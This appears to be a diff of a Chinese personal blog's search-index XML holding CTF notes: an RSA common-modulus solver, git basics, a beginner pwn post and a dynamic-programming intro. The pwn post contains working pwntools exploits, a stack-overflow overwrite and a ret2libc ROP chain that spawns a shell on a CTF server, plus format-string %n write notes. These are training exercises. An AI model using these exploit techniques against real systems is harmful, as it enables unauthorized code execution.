gmpy2.gcdext(e1, e2)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;mpz:&quot;</span>,s)</span><br><span class="line">    s1 = s[<span class="number">1</span>]</span><br><span class="line">    s2 = s[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">if</span> s1 &lt; <span class="number">0</span>:</span><br><span class="line">        s1 = - s1</span><br><span class="line">        c1 = gmpy2.invert(c1, n)</span><br><span class="line">    <span class="keyword">elif</span> s2 &lt; <span class="number">0</span>:</span><br><span class="line">        s2 = - s2</span><br><span class="line">        c2 = gmpy2.invert(c2, n)</span><br><span class="line">    m = (<span class="built_in">pow</span>(c1,s1,n) * <span class="built_in">pow</span>(c2 ,s2 ,n)) % n</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(m)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># def de(c, e, n): #因为此时的m不是真正的m，而是m^k，所以对m^k进行爆破</span></span><br><span class="line"><span class="comment">#     k = 0</span></span><br><span class="line"><span class="comment">#     while k&lt;1000: #指定k小于1000</span></span><br><span class="line"><span class="comment">#         mk = c + n*k</span></span><br><span class="line"><span class="comment">#         flag, true1 = gmpy2.iroot(mk, e)  #返回的第一个数值为开方数，第二个数值为布尔型，可整除为true，可自行测试</span></span><br><span class="line"><span class="comment">#         if True == true1:</span></span><br><span class="line"><span class="comment">#             # print(libnum.n2s(int(flag)))</span></span><br><span class="line"><span class="comment">#             return flag</span></span><br><span class="line"><span class="comment">#         k += 1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># for e1 in range(2,e1e2):</span></span><br><span class="line"><span class="comment">#     if e1e2%e1==0:         #爆破可整除的e</span></span><br><span class="line"><span class="comment">#         e2=e1e2//e1</span></span><br><span class="line"><span class="comment">#         c=rsa_gong_N_def(e1, e2, c1, c2, n)</span></span><br><span class="line"><span class="comment">#         e=gmpy2.gcd(e1,e2)</span></span><br><span class="line"><span class="comment">#         m1=de(c, e, n)</span></span><br><span class="line"><span class="comment">#         if m1:  #指定输出m1</span></span><br><span class="line"><span class="comment">#             print(libnum.n2s(int(m1)))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#m = same_module.attack(n, e1, e2, flag1, flag2)</span></span><br><span class="line">m=rsa_gong_N_def(e1,e2,flag1,flag2,n)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m)).decode())</span><br></pre></td></tr></table></figure>
+<p>中间被注释掉的部分是为了处理更难级别的题目，但在此题暂时还用不上。</p>
+<p>暂时先到这里吧，RSA其中原理以及逆元还不是很清楚，摆烂（</p>
 <p><img src="https://i.niupic.com/images/2022/09/04/a51S.jpg" alt=""></p>
-<h3 id="堆学习">堆学习</h3>
-<p>这里主要是学习了ptmalloc2 – glibc的堆实现和堆利用。</p>
-<h4 id="堆的相关数据结构">堆的相关数据结构</h4>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  This struct declaration is misleading (but accurate and necessary).</span></span><br><span class="line"><span class="comment">  It declares a &quot;view&quot; into memory allowing access to necessary</span></span><br><span class="line"><span class="comment">  fields at known offsets from a given base. See explanation below.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">malloc_chunk</span> &#123;</span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">malloc_chunk</span>* fd;         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">malloc_chunk</span>* bk;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">malloc_chunk</span>* fd_nextsize; <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">malloc_chunk</span>* bk_nextsize;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-<p>可以看出在一个chunk中有这样几个数据</p>
-<ul>
-<li>prev_size: 如果该 chunk 的**物理相邻的前一地址 chunk（两个指针的地址差值为前一 chunk 大小）**是空闲的话，那该字段记录的是前一个 chunk 的大小 (包括 chunk 头)。否则，该字段可以用来存储物理相邻的前一个 chunk 的数据。<strong>这里的前一 chunk 指的是较低地址的 chunk</strong> 。也就是说，上一个chunk空闲，表示大小，调用，则表示值。</li>
-<li>size：该chunk的大小，大小必须是 2 * SIZE_SZ 的整数倍。如果申请的内存大小不是 2 * SIZE_SZ 的整数倍，会被转换满足大小的最小的 2 * SIZE_SZ 的倍数。32 位系统中，SIZE_SZ 是 4；64 位系统中，SIZE_SZ 是 8。 也就是说64位size是16的整数倍，32位size是8的整数倍，这里就说明无论是32还是64位，size的低三位都一定是0，这样的话在chunk中这三位可以表示其他信息，分别从高到低表示为A，M，P。A表示该chunk是否属于主线程，1表示不属于，0表示属于；M表示记录当前chunk是否由mmap分配；P表示记录<strong>前一个 chunk</strong> 块是否被分配。一般来说，堆中<strong>第一个被分配的内存块的 size 字段的 P 位都会被设置为 1</strong>，以便于防止访问前面的非法内存。**当一个 chunk 的 size 的 P 位为 0 时，我们能通过 prev_size 字段来获取上一个 chunk 的大小以及地址。***这也方便进行空闲 chunk 之间的合并。</li>
-<li>fd和bk：fd表示指向下一个空闲的chunk，bk表示指向上一个空闲的chunk，这里要注意的是上下表示的是空闲的顺序而不是地址上的相邻。通过这里两个指针可以让空闲的chunk块加入到chunk块列表统一管理</li>
-<li>fd_nextsize,bk_nextsize：只用chunk空闲才使用，但用于较大的chunk，fd_nextsize指向前一个与当前chunk大小不同的第一个空闲块，不含bin指针；bk_nextsize指向后一个与当前chunk大小不同的第一个空闲块，不含bin指针。</li>
-</ul>
-<p>前两个字段称为chunk header,后面的部分称为user data。每次malloc申请得到的内存指针，是指向user data的起始处。</p>
-<p>当一个 chunk 处于使用状态时，它的下一个 chunk 的 prev_size 域无效，所以下一个 chunk 的该部分也可以被当前 chunk 使用。<strong>这就是 chunk 中的空间复用。</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of previous chunk, if unallocated (P clear)  |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of chunk, in bytes                     |A|M|P|</span><br><span class="line">  mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             User data starts here...                          .</span><br><span class="line">        .                                                               .</span><br><span class="line">        .             (malloc_usable_size() bytes)                      .</span><br><span class="line">next    .                                                               |</span><br><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             (size of chunk, but used for application data)    |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of next chunk, in bytes                |A|0|1|</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure>
-<p>被释放的chunk被记录在链表中，具体结构如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of previous chunk, if unallocated (P clear)  |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">`head:&#x27; |             Size of chunk, in bytes                     |A|0|P|</span><br><span class="line">  mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Forward pointer to next chunk in list             |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Back pointer to previous chunk in list            |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Unused space (may be 0 bytes long)                .</span><br><span class="line">        .                                                               .</span><br><span class="line"> next   .                                                               |</span><br><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">`foot:&#x27; |             Size of chunk, in bytes                           |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of next chunk, in bytes                |A|0|0|</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure>
-<h4 id="bin是什么">bin是什么</h4>
-<p>首先，用户释放的chunk不会马上归还给系统，ptmalloc会统一管理heap和mmap映射区域中空闲的chunk，用户再次请求分配内存时，ptmalloc会试图在空闲的chunk中挑选一块合适的给用户，可避免频繁地系统调用。ptmalloc会将空闲chunk的大小以及使用状态将chunk分为4类，fast bins, small bins, large bins, unsorted bin。相似大小的chunk会用双向链表链接起来，也就是说每类bin的内部会有多个互不相关的链表来保存不同大小的chunk。</p>
+]]></content>
+      <tags>
+        <tag>密码学</tag>
+        <tag>基础</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>git的基本用法</title>
+    <url>/2022/09/13/git%E7%9A%84%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/</url>
+    <content><![CDATA[<p>git命令行的基本用法：</p>
+<span id="more"></span>
+<h3 id="Git-commit">Git commit</h3>
+<p>提交内容，初始状态：</p>
+<p><img src="https://i.niupic.com/images/2022/09/13/a5cl.jpg" alt=""></p>
+<p>输入指令:<strong>git commit</strong></p>
+<p><img src="https://i.niupic.com/images/2022/09/13/a5cm.jpg" alt=""></p>
+<h3 id="Git-branch">Git branch</h3>
+<p>形成一个新的分支，初始状态：</p>
+<p><img src="https://i.niupic.com/images/2022/09/13/a5cn.jpg" alt=""></p>
+<p>输入指令：<strong>git branch newImage</strong></p>
+<p><img src="https://i.niupic.com/images/2022/09/13/a5co.jpg" alt=""></p>
+<p>输入指令：<strong>git checkout newImage + git commit</strong></p>
+<p><img src="https://i.niupic.com/images/2022/09/13/a5cp.jpg" alt=""></p>
+<h3 id="Git-merge">Git merge</h3>
+<p>合并分支，初始状态：</p>
+<p><img src="https://i.niupic.com/images/2022/09/13/a5cq.jpg" alt=""></p>
+<p>输入指令<strong>git merge bugFix</strong>,此时会把bugFix包起来，注意当前指针指向Main</p>
+<p><img src="https://i.niupic.com/images/2022/09/13/a5cr.jpg" alt=""></p>
+<p>此时调整指针到bugFix，再合并到main分支即可，命令行：<strong>git checkout bugFix + git merge main</strong></p>
+<p><img src="https://i.niupic.com/images/2022/09/13/a5cs.jpg" alt=""></p>
+<h3 id="Git-rebase">Git rebase</h3>
+<p>由并行状态合并为线性状态，初始状态：</p>
+<p><img src="https://i.niupic.com/images/2022/09/13/a5ct.jpg" alt=""></p>
+<p>输入指令：<strong>git rebase main</strong></p>
+<p><img src="https://i.niupic.com/images/2022/09/13/a5cw.jpg" alt=""></p>
+<p>输入指令：<strong>git checkout main</strong></p>
+<p><img src="https://i.niupic.com/images/2022/09/13/a5cu.jpg" alt=""></p>
+<p><strong>git rebase bugFix</strong></p>
+<p><img src="https://i.niupic.com/images/2022/09/13/a5cv.jpg" alt=""></p>
+<h3 id="Git-branch-f-XXX-HEAD-n">Git branch -f XXX HEAD~n</h3>
+<p>修改main分支到前几次的提交状态，初始状态：</p>
+<p><img src="https://i.niupic.com/images/2022/09/14/a5cP.jpg" alt=""></p>
+<p>指令<strong>git branch -f main HEAD~3</strong></p>
+<p><img src="https://i.niupic.com/images/2022/09/14/a5cQ.jpg" alt=""></p>
+<h3 id="Git-cherry-pick">Git cherry-pick</h3>
+<p>将后交的状态复制到main分支中，初始状态：</p>
+<p><img src="https://i.niupic.com/images/2022/09/14/a5cR.jpg" alt=""></p>
+<p>指令<strong>git cherry-pick c2 c4</strong></p>
+<p><img src="https://i.niupic.com/images/2022/09/14/a5cS.jpg" alt=""></p>
+<h3 id="Git-rebase-2">Git rebase</h3>
+<p>将已有的提交记录复制一份，可以自行选择顺序，分支，初始状态：</p>
+<p><img src="https://i.niupic.com/images/2022/09/14/a5cT.jpg" alt=""></p>
+<p>指令<strong>git rebase -i HEAD~4</strong></p>
+<p><img src="https://i.niupic.com/images/2022/09/14/a5cU.jpg" alt=""></p>
 ]]></content>
       <categories>
-        <category>CTF!</category>
+        <category>乱七八糟的东东</category>
       </categories>
       <tags>
         <tag>基础</tag>
-        <tag>pwn</tag>
+        <tag>git</tag>
       </tags>
   </entry>
   <entry>
@@ -446,6 +367,206 @@
       </tags>
   </entry>
   <entry>
+    <title>pwn:从一窍不通到入门的门前</title>
+    <url>/2022/07/06/pwn-%E4%BB%8E%E4%B8%80%E7%AA%8D%E4%B8%8D%E9%80%9A%E5%88%B0%E5%85%A5%E9%97%A8%E7%9A%84%E9%97%A8%E5%89%8D/</url>
+    <content><![CDATA[<p>基础pwn例题，栈溢出，格式化字符串。</p>
+<span id="more"></span>
+<h3 id="栈溢出例题">栈溢出例题</h3>
+<h4 id="hello-pwn">hello_pwn</h4>
+<p>来源：攻防世界</p>
+<p>首先先checksec：</p>
+<p><img src="https://i.niupic.com/images/2022/09/04/a51X.png" alt=""></p>
+<p>再看伪代码：</p>
+<p><img src="https://i.niupic.com/images/2022/09/04/a51Y.png" alt=""></p>
+<p>再看偏移量：</p>
+<p><img src="https://i.niupic.com/images/2022/09/04/a51Z.png" alt=""></p>
+<p>这里基本就明白了：当dowrd_60106C=1853186401时，执行下面的sub函数，sub函数就直接得出flag了，因此只要再前一步的read函数那里创造栈溢出，再人为满足条件判断即可。</p>
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./hello_pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;111.200.241.244&#x27;,52016)</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p64(<span class="number">1853186401</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h4 id="level3">level3</h4>
+<p>来源：攻防世界</p>
+<p>checksec:</p>
+<p><img src="https://i.niupic.com/images/2022/09/04/a520.png" alt=""></p>
+<p>32位程序，开启堆栈不可执行，这是一道构造ROP的经典例题。</p>
+<p><img src="https://i.niupic.com/images/2022/09/04/a521.png" alt=""></p>
+<p>源码看出漏洞还是栈溢出，但是此时找不到现成的system函数和binsh字符串。</p>
+<p>因此要找到system函数，知识点(搬运自wiki)</p>
+<ul>
+<li>system 函数属于 libc，而 <a href="http://libc.so">libc.so</a> 动态链接库中的函数之间相对偏移是固定的。</li>
+<li>即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。</li>
+<li>查找Libc的网址：<a href="https://libc.blukat.me/">https://libc.blukat.me/</a>和<a href="https://libc.rip/">https://libc.rip/</a></li>
+</ul>
+<p>简单来说：实际的(真实的)地址是需要计算出来的，具体计算方式是：<strong>实际地址=libc偏移量+libc基地址</strong>在已知libc的情况下，我们需要做的就是找到<strong>libc的基址</strong>，而想要找到基址，我们需要知道一个函数的实际地址，本题中关键函数内存在write,read函数，因此想法是使用write函数泄露出write函数的真实地址，而plt表，got表，实际加载地址可以参考下图(搬运自csdn(滑稽))：</p>
+<p><img src="https://i.niupic.com/images/2022/09/04/a522.png" alt=""></p>
+<p>这样就可以得到基本的思路了: 先构造栈溢出使程序跳到write函数的plt表地址上，此时再次调用main函数或者vulnerable函数再次执行，此时就可以利用write函数打印出write的got表地址，此时需要我们人为的输入write函数的参数。这样就可以得到write函数的真实地址了。栈上的流程大概是这样的（仍然是搬运的(滑天下之大稽）：</p>
+<p><img src="https://i.niupic.com/images/2022/09/04/a523.png" alt=""></p>
+<p>这样输出之后我们就得到了write函数的真实地址了，再通过libc来求得system和binsh的真实地址，最后第二次调动程序，再次利用漏洞，就可以得到shell。</p>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=process(&#x27;./level3&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;61.147.171.105&#x27;</span>,<span class="number">59245</span>)</span><br><span class="line"></span><br><span class="line">padding=<span class="number">0x88</span></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./level3&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc_32.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;:\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(write_plt)+p32(main_addr)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">write_got_addr=u32(p.recv()[:<span class="number">4</span>])</span><br><span class="line"><span class="built_in">print</span>(write_got_addr)</span><br><span class="line"></span><br><span class="line">libc_write=libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">libc_base=write_got_addr-libc_write</span><br><span class="line"></span><br><span class="line">system_addr=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;the system address is:&#x27;</span>,<span class="built_in">hex</span>(system_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_bin=<span class="built_in">next</span>(libc.search(<span class="string">b&quot;bin/sh&quot;</span>))//找到binsh偏移的方法</span><br><span class="line">bin_addr=libc_base+libc_bin</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;the binsh address is:&quot;</span>,<span class="built_in">hex</span>(bin_addr))</span><br><span class="line"></span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*padding+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(system_addr)+p32(<span class="number">0xdeadbeef</span>)+p32(bin_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;:\n&#x27;</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h3 id="格式化字符串">格式化字符串</h3>
+<p>基本原理以及利用方法在wiki上有解释。</p>
+<p>&lt;<a href="https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-intro/">原理介绍 - CTF Wiki (ctf-wiki.org)</a>&gt;</p>
+<p>主要意思是利用printf一类函数漏洞，当函数没有严格规定格式化字符串时，攻击者可以控制printf函数来输出其他内容，由于格式化字符串输出的是栈上内容，因此此漏洞可以找到栈上其他位置的信息，比如地址，数据。总结一下就是：超出的每一个格式化字符串都能对下一格栈空间造成影响。</p>
+<p>%d:打印成数字，只能泄露栈本身内容</p>
+<p>%x:打印成16进制，只能泄露栈本身内容</p>
+<p>%s:识别栈上内容为指针，打印出该指针指向的位置，这里有可能造成任意地址的泄露（只要能控制栈并完成布局）</p>
+<p>%c:输出字符</p>
+<p>%n:把前面已经打印的长度<strong>写入</strong>某个内存地址(实现任意地址写入)</p>
+<p>%n:写入4个字节，写入1–&gt;0000 0001</p>
+<p>%hn:写入两个字节，写入1–&gt;0001</p>
+<p>%hhn:写入单个字节,写入1–&gt;01</p>
+<h3 id="整数溢出">整数溢出</h3>
+<p>啥都没有，因为懒得搞，搞堆去了</p>
+<p><img src="https://i.niupic.com/images/2022/09/04/a51S.jpg" alt=""></p>
+<h3 id="堆学习">堆学习</h3>
+<p>这里主要是学习了ptmalloc2 – glibc的堆实现和堆利用。</p>
+<h4 id="堆的相关数据结构">堆的相关数据结构</h4>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  This struct declaration is misleading (but accurate and necessary).</span></span><br><span class="line"><span class="comment">  It declares a &quot;view&quot; into memory allowing access to necessary</span></span><br><span class="line"><span class="comment">  fields at known offsets from a given base. See explanation below.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">malloc_chunk</span> &#123;</span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">malloc_chunk</span>* fd;         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">malloc_chunk</span>* bk;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">malloc_chunk</span>* fd_nextsize; <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">malloc_chunk</span>* bk_nextsize;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>可以看出在一个chunk中有这样几个数据</p>
+<ul>
+<li>prev_size: 如果该 chunk 的**物理相邻的前一地址 chunk（两个指针的地址差值为前一 chunk 大小）**是空闲的话，那该字段记录的是前一个 chunk 的大小 (包括 chunk 头)。否则，该字段可以用来存储物理相邻的前一个 chunk 的数据。<strong>这里的前一 chunk 指的是较低地址的 chunk</strong> 。也就是说，上一个chunk空闲，表示大小，调用，则表示值。</li>
+<li>size：该chunk的大小，大小必须是 2 * SIZE_SZ 的整数倍。如果申请的内存大小不是 2 * SIZE_SZ 的整数倍，会被转换满足大小的最小的 2 * SIZE_SZ 的倍数。32 位系统中，SIZE_SZ 是 4；64 位系统中，SIZE_SZ 是 8。 也就是说64位size是16的整数倍，32位size是8的整数倍，这里就说明无论是32还是64位，size的低三位都一定是0，这样的话在chunk中这三位可以表示其他信息，分别从高到低表示为A，M，P。A表示该chunk是否属于主线程，1表示不属于，0表示属于；M表示记录当前chunk是否由mmap分配；P表示记录<strong>前一个 chunk</strong> 块是否被分配。一般来说，堆中<strong>第一个被分配的内存块的 size 字段的 P 位都会被设置为 1</strong>，以便于防止访问前面的非法内存。**当一个 chunk 的 size 的 P 位为 0 时，我们能通过 prev_size 字段来获取上一个 chunk 的大小以及地址。***这也方便进行空闲 chunk 之间的合并。</li>
+<li>fd和bk：fd表示指向下一个空闲的chunk，bk表示指向上一个空闲的chunk，这里要注意的是上下表示的是空闲的顺序而不是地址上的相邻。通过这里两个指针可以让空闲的chunk块加入到chunk块列表统一管理</li>
+<li>fd_nextsize,bk_nextsize：只用chunk空闲才使用，但用于较大的chunk，fd_nextsize指向前一个与当前chunk大小不同的第一个空闲块，不含bin指针；bk_nextsize指向后一个与当前chunk大小不同的第一个空闲块，不含bin指针。</li>
+</ul>
+<p>前两个字段称为chunk header,后面的部分称为user data。每次malloc申请得到的内存指针，是指向user data的起始处。</p>
+<p>当一个 chunk 处于使用状态时，它的下一个 chunk 的 prev_size 域无效，所以下一个 chunk 的该部分也可以被当前 chunk 使用。<strong>这就是 chunk 中的空间复用。</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of previous chunk, if unallocated (P clear)  |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of chunk, in bytes                     |A|M|P|</span><br><span class="line">  mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             User data starts here...                          .</span><br><span class="line">        .                                                               .</span><br><span class="line">        .             (malloc_usable_size() bytes)                      .</span><br><span class="line">next    .                                                               |</span><br><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             (size of chunk, but used for application data)    |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of next chunk, in bytes                |A|0|1|</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure>
+<p>被释放的chunk被记录在链表中，具体结构如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of previous chunk, if unallocated (P clear)  |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">`head:&#x27; |             Size of chunk, in bytes                     |A|0|P|</span><br><span class="line">  mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Forward pointer to next chunk in list             |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Back pointer to previous chunk in list            |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Unused space (may be 0 bytes long)                .</span><br><span class="line">        .                                                               .</span><br><span class="line"> next   .                                                               |</span><br><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">`foot:&#x27; |             Size of chunk, in bytes                           |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of next chunk, in bytes                |A|0|0|</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure>
+<h4 id="bin是什么">bin是什么</h4>
+<p>首先，用户释放的chunk不会马上归还给系统，ptmalloc会统一管理heap和mmap映射区域中空闲的chunk，用户再次请求分配内存时，ptmalloc会试图在空闲的chunk中挑选一块合适的给用户，可避免频繁地系统调用。ptmalloc会将空闲chunk的大小以及使用状态将chunk分为4类，fast bins, small bins, large bins, unsorted bin。相似大小的chunk会用双向链表链接起来，也就是说每类bin的内部会有多个互不相关的链表来保存不同大小的chunk。</p>
+]]></content>
+      <categories>
+        <category>CTF!</category>
+      </categories>
+      <tags>
+        <tag>基础</tag>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>基础算法02</title>
+    <url>/2022/07/01/%E5%9F%BA%E7%A1%80%E7%AE%97%E6%B3%9502/</url>
+    <content><![CDATA[<p>dp(动态规划)的基本例题，可以浅浅的帮助理解。</p>
+<span id="more"></span>
+<h4 id="例题一">例题一</h4>
+<p>先来看一道很简单的例题：</p>
+<p><img src="https://i.niupic.com/images/2022/09/04/a51T.png" alt=""></p>
+<p>具体要求如下：</p>
+<p><img src="https://i.niupic.com/images/2022/09/04/a51U.png" alt=""></p>
+<p>根据格式可以推出状态方程，这个方程不难，主要关注dp思想，找到状态方程，此题不难发现每一个数字只能往下或者往右走，因此每一个位置的最大值就等于其上面或上左位置的最大值，找到每一个数的最大值，这基本就是动态规划的思想。</p>
+<p>核心代码如下：</p>
